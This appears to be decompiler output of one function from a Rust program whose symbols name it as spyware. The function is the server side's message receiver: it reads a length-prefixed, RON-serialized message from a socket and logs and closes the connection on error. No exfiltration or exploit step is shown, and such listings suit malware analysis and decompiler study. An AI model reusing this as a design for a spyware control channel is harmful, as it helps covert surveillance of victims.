long long spyware::communication::server::get_message(struct_0 *a0, unsigned long long a1)
{
    unsigned int v0;  // [bp-0x114]
    unsigned long long v1;  // [bp-0x110]
    unsigned long long v2;  // [bp-0x108]
    char v3;  // [bp-0x100], Other Possible Types: unsigned long long
    unsigned int v4;  // [bp-0xfe]
    unsigned short v5;  // [bp-0xfa]
    unsigned long long v6;  // [bp-0xf8]
    char v7;  // [bp-0xf0], Other Possible Types: unsigned long long
    unsigned long long v8;  // [bp-0xe8]
    unsigned long long v9;  // [bp-0xe0]
    unsigned short v10;  // [bp-0xd8]
    unsigned int v11;  // [bp-0xd6]
    unsigned short v12;  // [bp-0xd2]
    unsigned long long v13;  // [bp-0xd0]
    char v14;  // [bp-0xc8]
    char *v15;  // [bp-0xb8]
    unsigned long long v16;  // [bp-0xb0]
    char *v17;  // [bp-0xa8]
    unsigned long long v18;  // [bp-0xa0]
    unsigned long long v19;  // [bp-0x98]
    unsigned long long v20;  // [bp-0x90]
    char *v21;  // [bp-0x88]
    unsigned long long v22;  // [bp-0x80]
    void* v23;  // [bp-0x78]
    int v24;  // [bp-0x58], Other Possible Types: char
    int v25;  // [bp-0x48]
    int v26;  // [bp-0x38]
    int v27;  // [bp-0x28]
    char v28;  // [bp-0x18]
    unsigned long long v30;  // rax
    unsigned long long v31;  // rax
    unsigned long long v32;  // rax
    char v35;  // cl

    v1 = a1;
    v0 = 0;
    v30 = std::io::default_read_exact(&v1, &v0, 4);
    if (!v30)
    {
        (char)v3.from_elem(spyware::communication::serialization::extract_msg_type_and_length(v0));
        std::io::default_read_exact(&v1, v6, v7).expect();
        ron::de::from_bytes(&(char)v19, v6, v7, v35);
        v24.unwrap(&(char)v19);
        *((void*)&a0->field_30) = v27;
        *((void*)&a0->field_20) = v26;
        *((void*)&a0->field_10) = v25;
        *((void*)&a0->field_0) = v24;
        return (unsigned long long)::0x44bac0::core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&(char)v3);
    }
    v2 = v30;
    if (::0x44be40::core::sync::atomic::atomic_load())
    {
        (char)v3.peer_addr(v1);
        if (*((short *)&v3) == 2)
        {
            *((unsigned long long *)&a0->padding_1[7]) = v6;
            *((unsigned long long *)&a0->field_0) = 9223372036854775818;
            return (unsigned long long)::0x44ba90::core::ptr::drop_in_place<std::io::error::Error>(&v2);
        }
        v12 = v5;
        v11 = v4;
        memcpy(&v28, &v7, 16);
        v10 = *((short *)&v3);
        v13 = v6;
        memcpy(&v14, &v7, 16);
        v15 = &v10;
        v16 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
        v17 = &v2;
        v18 = <std::io::error::Error as core::fmt::Display>::fmt;
        v19 = &g_4b8bb0;
        v20 = 2;
        v23 = 0;
        v21 = &v15;
        v22 = 2;
        v32 = log::__private_api::loc(&g_4b8c18);
        v3 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
        v6 = 30;
        v7 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
        v8 = 30;
        v9 = v32;
        log::__private_api::log(&v19, 1, &(char)v3);
    }
    v31 = v1.shutdown(2);
    if (!v31)
    {
        *((unsigned long long *)&a0->padding_1[7]) = v2;
        *((unsigned long long *)&a0->field_0) = 9223372036854775818;
        return 9223372036854775818;
    }
    *((unsigned long long *)&a0->padding_1[7]) = v31;
    *((unsigned long long *)&a0->field_0) = 9223372036854775818;
    return (unsigned long long)::0x44ba90::core::ptr::drop_in_place<std::io::error::Error>(&v2);
}
